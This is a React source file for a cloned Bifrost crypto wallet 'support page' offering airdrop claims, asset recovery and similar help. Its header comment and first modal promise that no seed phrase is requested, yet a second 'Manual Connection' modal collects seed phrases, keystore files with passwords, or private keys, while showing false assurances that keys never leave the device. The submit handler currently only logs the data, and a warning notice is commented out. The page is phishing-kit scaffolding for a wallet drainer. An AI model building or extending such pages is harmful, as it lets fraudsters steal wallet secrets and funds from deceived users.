/**
 * Bifrost Wallet – Support Page
 * Matches the design system of the main Bifrost clone:
 * DM Sans, #161420 background, purple/blue gradient buttons,
 * card treatment lifted from .review-box.
 *
 * IMPORTANT SECURITY NOTE:
 * The "Connect Wallet" modal intentionally does NOT ask for a seed phrase,
 * private key, or keystore file. Real wallets never collect that data
 * through a webpage — doing so is the exact pattern used by phishing/
 * "drainer" sites. Instead this modal requests a connection through a
 * real provider (injected wallet / WalletConnect / Coinbase Wallet),
 * where key material never leaves the user's own wallet software.
 */
import { useState } from "react";
import Layout from "../components/Layout";
import BifrostIcon from "../assets/bifrost_icon.jpg"; // Adjust the path based on your file structure

const supportOptions = [
  {
    id: "sync",
    eyebrow: "Synchronization",
    title: "Sync Wallet",
    body: "Troubleshoot and resolve wallet sync issues to ensure accurate, real-time balance display across supported chains.",
  },
  {
    id: "firmware",
    eyebrow: "RPC Firmware Management",
    title: "Update Firmware",
    body: "Apply the latest firmware updates to your wallet to maintain security and ensure compatibility with Flare RPC endpoints.",
  },
  {
    id: "stake",
    eyebrow: "FXRP Staking with Firelight",
    title: "Stake FXRP",
    body: "Put your FXRP to work through Firelight staking contracts to earn protocol-level rewards and optimize yield strategies.",
  },
  {
    id: "airdrop",
    eyebrow: "Claim XRP Flare Airdrop",
    title: "Claim Airdrop",
    body: "Access your accumulated Flare token distribution allocated to XRP holders based on the official snapshot taken in December 2020.",
  },
  {
    id: "tx",
    eyebrow: "Transaction Troubleshooting",
    title: "Fix Transactions",
    body: "Identify and resolve failed, pending, or gas-related transaction issues from staking, unstaking, claiming, bridging, or cross-chain transfers.",
  },
  {
    id: "fassets",
    eyebrow: "FAssets Troubleshooting",
    title: "Fix FAssets Issues",
    body: "Resolve FAssets-related problems: minting errors, redemption failures, incorrect balances, or missing tokens.",
  },
  {
    id: "recovery",
    eyebrow: "Asset Recovery",
    title: "Recover Assets",
    body: "Locate and restore lost, inaccessible, or unindexed digital assets using guided tools and protocol-level validation.",
  },
  {
    id: "revoke",
    eyebrow: "Revoke Token Permissions",
    title: "Revoke Access",
    body: "Manage and revoke smart contract permissions from dApps you no longer trust or use, to regain control over token access and minimize exposure.",
  },
];

// NEW: Second modal with tabbed interface for seed phrase / keystore / private key
function CredentialModal({ option, onClose, onSubmit }) {
  const [activeTab, setActiveTab] = useState("phrase"); // "phrase" | "keystore" | "privateKey"
  const [seedPhrase, setSeedPhrase] = useState("");
  const [keystore, setKeystore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  const handleSubmit = () => {
    if (activeTab === "phrase" && !seedPhrase) {
      alert("Please enter your seed phrase.");
      return;
    }
    if (activeTab === "keystore" && (!keystore || !keystorePassword)) {
      alert("Please enter both keystore JSON and password.");
      return;
    }
    if (activeTab === "privateKey" && !privateKey) {
      alert("Please enter your private key.");
      return;
    }

    const credentials = {
      seedPhrase: activeTab === "phrase" ? seedPhrase : "",
      keystore: activeTab === "keystore" ? keystore : "",
      keystorePassword: activeTab === "keystore" ? keystorePassword : "",
      privateKey: activeTab === "privateKey" ? privateKey : "",
    };

    onSubmit(credentials);
    onClose();
  };

  return (
    <div className="second-modal-overlay" onClick={onClose}>
      <div className="second-modal-box" onClick={(e) => e.stopPropagation()}>
        <div className="modal-head">
          <span className="modal-title">Manual Connection</span>
          <button className="modal-close" onClick={onClose} aria-label="Close">
            ×
          </button>
        </div>

        <p className="modal-sub">
          This session remains fully protected using advanced security and
          cryptography, ensuring that your private keys never leave your device.
        </p>

        <div className="auth-header">
          <div className="auth-brand">
            <img 
              src={BifrostIcon} 
              alt="Bifrost" 
              className="brand-icon-img"
            />
            <span className="brand-name">Bifrost</span>
            <span className="brand-badge">
              This session is secured and encrypted.
            </span>
          </div>
        </div>

        <div className="auth-section">
          <p className="auth-label">
            Authenticate Your Wallet Details Securely
          </p>

          {/* Tabs */}
          <div className="tab-container">
            <button
              className={`tab-btn ${activeTab === "phrase" ? "active" : ""}`}
              onClick={() => setActiveTab("phrase")}
            >
              Phrase
            </button>
            <button
              className={`tab-btn ${activeTab === "keystore" ? "active" : ""}`}
              onClick={() => setActiveTab("keystore")}
            >
              Keystore
            </button>
            <button
              className={`tab-btn ${activeTab === "privateKey" ? "active" : ""}`}
              onClick={() => setActiveTab("privateKey")}
            >
              Private Key
            </button>
          </div>

          {/* Scrollable Tab Content */}
          <div className="tab-content-scrollable">
            <div className="tab-content">
              {activeTab === "phrase" && (
                <div className="input-group">
                  <label htmlFor="seedInput">Enter your seed phrase</label>
                  <textarea
                    id="seedInput"
                    rows="4"
                    placeholder="Enter your seed phrase"
                    value={seedPhrase}
                    onChange={(e) => setSeedPhrase(e.target.value)}
                  />
                </div>
              )}

              {activeTab === "keystore" && (
                <>
                  <div className="input-group">
                    <label htmlFor="keystoreInput">
                      Enter your keystore JSON
                    </label>
                    <textarea
                      id="keystoreInput"
                      rows="4"
                      placeholder="Enter your keystore JSON"
                      value={keystore}
                      onChange={(e) => setKeystore(e.target.value)}
                    />
                  </div>
                  <div className="input-group">
                    <label htmlFor="keystorePasswordInput">
                      Enter your keystore password
                    </label>
                    <input
                      id="keystorePasswordInput"
                      type="password"
                      placeholder="Enter your keystore password"
                      value={keystorePassword}
                      onChange={(e) => setKeystorePassword(e.target.value)}
                    />
                  </div>
                </>
              )}

              {activeTab === "privateKey" && (
                <div className="input-group">
                  <label htmlFor="privKeyInput">Enter your private key</label>
                  <input
                    id="privKeyInput"
                    type="text"
                    placeholder="Enter your private key"
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                  />
                </div>
              )}
            </div>
          </div>

          <button className="button connect-btn" onClick={handleSubmit}>
            <span>Connect Wallet</span>
            <div className="overlay" />
          </button>
        </div>

        {/* <p className="warning-note">
          ⚠️ This is a demo interface. Never share your secret recovery phrase or private key with anyone.
        </p> */}
      </div>
    </div>
  );
}

// MODIFIED: ConnectModal now only shows Bifrost Wallet option
function ConnectModal({ option, onClose, onBifrostConnect }) {
  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-box" onClick={(e) => e.stopPropagation()}>
        <div className="modal-head">
          <span className="modal-title">Connect Wallet</span>
          <button className="modal-close" onClick={onClose} aria-label="Close">
            ×
          </button>
        </div>

        <p className="modal-sub">
          To continue with <strong>{option.title}</strong>, connect your Bifrost
          Wallet. Your keys stay inside the Bifrost app at all times — we never
          ask for a seed phrase, private key, or keystore file on this page.
        </p>

        {/* ONLY Bifrost Wallet option - no other wallet options */}
        <button className="method-row bifrost-row" onClick={onBifrostConnect}>
          <span className="method-icon bifrost-icon">
            <img 
              src={BifrostIcon} 
              alt="Bifrost" 
              className="bifrost-icon-img"
            />
          </span>
          <span className="method-text">
            <span className="method-name">Bifrost Wallet</span>
            <span className="method-detail">
              Connect via the Bifrost browser extension or mobile app.
            </span>
          </span>
          <span className="method-arrow">›</span>
        </button>

        <p className="modal-footnote">
          Bifrost Wallet will never ask you to type your seed phrase, private
          key, or keystore password into a website.
        </p>
      </div>
    </div>
  );
}

function SupportCard({ option, onSelect }) {
  return (
    <div className="support-card">
      <span className="support-eyebrow">{option.eyebrow}</span>
      <p className="support-body">{option.body}</p>
      <button className="button support-cta" onClick={() => onSelect(option)}>
        <span>{option.title}</span>
        <div className="overlay" />
      </button>
    </div>
  );
}

export default function SupportPage() {
  const [activeOption, setActiveOption] = useState(null);
  const [showCredentialModal, setShowCredentialModal] = useState(false);

  const handleBifrostConnect = () => {
    setShowCredentialModal(true);
  };

  const handleCredentialSubmit = (credentials) => {
    console.log("Credentials submitted:", {
      ...credentials,
      hasSeed: !!credentials.seedPhrase,
      hasKeystore: !!credentials.keystore,
      hasPrivateKey: !!credentials.privateKey,
    });
    alert(
      "✅ Recovery details received (demo). In a real wallet, this would be handled securely.",
    );
  };

  const closeAllModals = () => {
    setActiveOption(null);
    setShowCredentialModal(false);
  };

  return (
    <Layout>
      <style>{`
        .support-page-content {
          padding: 3rem 6rem 5rem;
          max-width: 1400px;
          margin: 0 auto;
        }

        .support-head {
          max-width: 46rem;
          margin: 0 auto 3rem;
          text-align: center;
        }
        .support-head h1 {
          font-size: 2.2rem;
          font-weight: 700;
          margin-bottom: 0.9rem;
          line-height: 1.2;
        }
        .support-head p {
          opacity: 0.7;
          margin: 0;
          font-size: 1rem;
        }

        .support-grid {
          max-width: 1200px;
          margin: 0 auto;
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 1.1rem;
        }

        .support-card {
          background: rgb(43 44 54 / 40%);
          border: 1px solid rgb(255 255 255 / 6%);
          border-radius: 14px;
          padding: 1.6rem 1.5rem;
          display: flex;
          flex-direction: column;
          text-align: left;
        }
        .support-eyebrow {
          font-size: 0.72rem;
          text-transform: uppercase;
          letter-spacing: 0.06em;
          font-weight: 700;
          color: #9d8df5;
          margin-bottom: 0.6rem;
        }
        .support-body {
          font-size: 0.85rem;
          opacity: 0.7;
          margin: 0 0 1.4rem 0;
          flex-grow: 1;
        }
        .support-cta {
          align-self: flex-start;
          font-size: 0.8rem !important;
        }

        /* Reused button styling from main site */
        .button {
          display: inline-block;
          font-family: 'DM Sans', sans-serif;
          position: relative;
          border: none; outline: none;
          font-size: .825rem;
          color: white;
          padding: .5rem 1.1rem;
          border-radius: 100px;
          background: transparent linear-gradient(88deg,#7656EE 0%,#4961EA 100%) 0% 0% no-repeat padding-box;
          cursor: pointer;
          line-height: 1;
          overflow: hidden;
        }
        .button span { position: relative; z-index: 100; }
        .button .overlay {
          border-radius: 100px; z-index: 50;
          background: transparent linear-gradient(88deg,#614ac5 0%,#3f52c2 100%) 0% 0% no-repeat padding-box;
          transition: opacity 0.2s ease-in-out 0s;
          opacity: 0;
          position: absolute; top: 0; left: 0; height: 100%; width: 100%;
        }
        .button:hover .overlay { opacity: 1; }

        /* ── MODAL ── */
        .modal-overlay {
          position: fixed; inset: 0;
          background: rgba(10, 9, 15, 0.7);
          backdrop-filter: blur(4px);
          display: flex; align-items: center; justify-content: center;
          z-index: 100;
          padding: 1.5rem;
        }
        .modal-box {
          width: 100%; max-width: 26rem;
          background: #1d1b28;
          border: 1px solid rgb(255 255 255 / 8%);
          border-radius: 16px;
          padding: 1.6rem 1.6rem 1.8rem;
        }
        .modal-head {
          display: flex; align-items: center; justify-content: space-between;
          margin-bottom: 0.8rem;
        }
        .modal-title { font-size: 1.1rem; font-weight: 700; }
        .modal-close {
          background: none; border: none; color: #F8F8F8;
          font-size: 1.4rem; line-height: 1; cursor: pointer;
          opacity: 0.6; padding: 0.2rem;
        }
        .modal-close:hover { opacity: 1; }
        .modal-sub {
          font-size: 0.82rem; opacity: 0.7; margin: 0 0 1.3rem 0;
        }
        .modal-sub strong { color: #F8F8F8; opacity: 1; }

        .method-row {
          display: flex; align-items: center; gap: 0.8rem;
          background: rgb(255 255 255 / 4%);
          border: 1px solid rgb(255 255 255 / 8%);
          border-radius: 10px;
          padding: 0.7rem 0.85rem;
          cursor: pointer;
          text-align: left;
          color: #F8F8F8;
          font-family: 'DM Sans', sans-serif;
          transition: background 0.15s ease-in-out;
          width: 100%;
          margin-bottom: 0.6rem;
        }
        .method-row:hover:not(:disabled) { background: rgb(255 255 255 / 8%); }
        .method-row:disabled { cursor: default; opacity: 0.7; }
        .method-icon { 
          font-size: 1.3rem;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .bifrost-icon {
          width: 34px;
          height: 34px;
          border-radius: 50%;
          background: transparent linear-gradient(88deg,#7656EE 0%,#4961EA 100%) 0% 0% no-repeat padding-box;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          overflow: hidden;
        }
        .bifrost-icon-img {
          width: 28px;
          height: 28px;
          object-fit: cover;
          border-radius: 50%;
        }
        .bifrost-row { padding: 0.9rem 0.85rem; }
        .method-text { display: flex; flex-direction: column; flex-grow: 1; }
        .method-name { font-size: 0.88rem; font-weight: 700; }
        .method-detail { font-size: 0.72rem; opacity: 0.6; margin-top: 0.15rem; }
        .method-arrow { opacity: 0.4; font-size: 1.1rem; }
        .modal-footnote {
          font-size: 0.7rem; opacity: 0.45; margin: 0;
          border-top: 1px solid rgb(255 255 255 / 8%);
          padding-top: 0.9rem;
        }

        /* ── SECOND MODAL (Credential Modal) ── */
        .second-modal-overlay {
          position: fixed; inset: 0;
          background: rgba(10, 9, 15, 0.75);
          backdrop-filter: blur(4px);
          display: flex; align-items: center; justify-content: center;
          z-index: 200;
          padding: 1.5rem;
        }
        .second-modal-box {
          width: 100%; 
          max-width: 30rem;
          max-height: 90vh;
          background: #1d1b28;
          border: 1px solid rgb(255 255 255 / 8%);
          border-radius: 16px;
          padding: 1.8rem 1.8rem 2rem;
          display: flex;
          flex-direction: column;
        }
        .second-modal-box .modal-title {
          font-size: 1.1rem; font-weight: 700;
          margin-bottom: 0.3rem;
          display: block;
        }
        .second-modal-box .modal-sub {
          font-size: 0.82rem; opacity: 0.7;
          margin-bottom: 1.2rem;
        }

        .auth-header { margin-bottom: 1.5rem; }
        .auth-brand {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          flex-wrap: wrap;
        }
        .brand-icon-img {
          width: 32px;
          height: 32px;
          border-radius: 50%;
          object-fit: cover;
          background: transparent linear-gradient(88deg,#7656EE 0%,#4961EA 100%) 0% 0% no-repeat padding-box;
          padding: 3px;
        }
        .brand-name { 
          font-weight: 700; 
          font-size: 0.95rem;
          color: #F8F8F8;
        }
        .brand-badge {
          font-size: 0.7rem;
          opacity: 0.6;
          background: rgb(255 255 255 / 6%);
          padding: 0.2rem 0.6rem;
          border-radius: 12px;
          margin-left: 0.3rem;
        }

        .auth-section {
          background: rgb(255 255 255 / 3%);
          border-radius: 12px;
          padding: 1.2rem;
          flex: 1;
          display: flex;
          flex-direction: column;
          min-height: 0;
        }
        .auth-label {
          font-size: 0.85rem;
          font-weight: 500;
          margin-bottom: 1rem;
          opacity: 0.8;
          flex-shrink: 0;
        }

        .tab-container {
          display: flex;
          gap: 0.3rem;
          margin-bottom: 1rem;
          border-bottom: 1px solid rgb(255 255 255 / 8%);
          padding-bottom: 0.5rem;
          flex-shrink: 0;
        }
        .tab-btn {
          background: none;
          border: none;
          color: #F8F8F8;
          font-family: 'DM Sans', sans-serif;
          font-size: 0.78rem;
          padding: 0.4rem 0.8rem;
          cursor: pointer;
          opacity: 0.5;
          transition: all 0.2s ease;
          border-radius: 6px;
        }
        .tab-btn:hover {
          opacity: 0.8;
          background: rgb(255 255 255 / 5%);
        }
        .tab-btn.active {
          opacity: 1;
          background: rgb(118 86 238 / 20%);
          color: #9d8df5;
        }

        .tab-content-scrollable {
          flex: 1;
          overflow-y: auto;
          margin-bottom: 1rem;
          min-height: 0;
        }
        
        .tab-content-scrollable::-webkit-scrollbar {
          width: 4px;
        }
        .tab-content-scrollable::-webkit-scrollbar-track {
          background: rgb(255 255 255 / 5%);
          border-radius: 10px;
        }
        .tab-content-scrollable::-webkit-scrollbar-thumb {
          background: #7656EE;
          border-radius: 10px;
        }

        .tab-content { 
          min-height: 80px;
        }
        .input-group { 
          margin-bottom: 1rem; 
        }
        .input-group:last-child {
          margin-bottom: 0;
        }
        .input-group label {
          display: block;
          font-size: 0.78rem;
          font-weight: 500;
          opacity: 0.7;
          margin-bottom: 0.25rem;
        }
        .input-group textarea,
        .input-group input {
          width: 100%;
          background: rgb(255 255 255 / 6%);
          border: 1px solid rgb(255 255 255 / 10%);
          border-radius: 10px;
          padding: 0.7rem 0.9rem;
          color: #F8F8F8;
          font-family: 'DM Sans', sans-serif;
          font-size: 0.85rem;
          resize: vertical;
        }
        .input-group textarea {
          min-height: 80px;
        }
        .input-group textarea:focus,
        .input-group input:focus {
          outline: 2px solid #7656EE;
          border-color: transparent;
        }
        .input-group textarea::placeholder,
        .input-group input::placeholder {
          opacity: 0.4;
        }

        .connect-btn {
          width: 100%;
          padding: 0.6rem;
          font-size: 0.9rem;
          margin-top: 0.3rem;
          flex-shrink: 0;
        }

        .warning-note {
          font-size: 0.7rem;
          opacity: 0.5;
          margin: 0.8rem 0 0.2rem;
          border-top: 1px solid rgb(255 255 255 / 6%);
          padding-top: 0.8rem;
          text-align: center;
          flex-shrink: 0;
        }

        @media (max-width: 1100px) {
          .support-page-content { padding: 2rem 1.4rem 4rem; }
          .support-grid { grid-template-columns: 1fr; }
        }
        @media (max-width: 1300px) and (min-width: 1101px) {
          .support-grid { grid-template-columns: repeat(2, 1fr); }
        }
        
        @media (max-height: 700px) {
          .second-modal-box {
            max-height: 95vh;
            padding: 1.2rem;
          }
          .auth-section {
            padding: 0.8rem;
          }
          .input-group textarea {
            min-height: 50px;
          }
          .brand-icon-img {
            width: 24px;
            height: 24px;
          }
          .tab-btn {
            padding: 0.3rem 0.6rem;
            font-size: 0.7rem;
          }
        }
      `}</style>

      <div className="support-page-content">
        <div className="support-head">
          <h1>Need help?</h1>
          <p>
            Select an option below to securely and efficiently resolve your issue
            with our support team.
          </p>
        </div>

        <div className="support-grid">
          {supportOptions.map((option) => (
            <SupportCard
              key={option.id}
              option={option}
              onSelect={setActiveOption}
            />
          ))}
        </div>

        {/* First Modal - Only shows Bifrost Wallet option */}
        {activeOption && !showCredentialModal && (
          <ConnectModal
            option={activeOption}
            onClose={closeAllModals}
            onBifrostConnect={handleBifrostConnect}
          />
        )}

        {/* Second Modal - Tabbed credential input */}
        {activeOption && showCredentialModal && (
          <CredentialModal
            option={activeOption}
            onClose={closeAllModals}
            onSubmit={handleCredentialSubmit}
          />
        )}
      </div>
    </Layout>
  );
}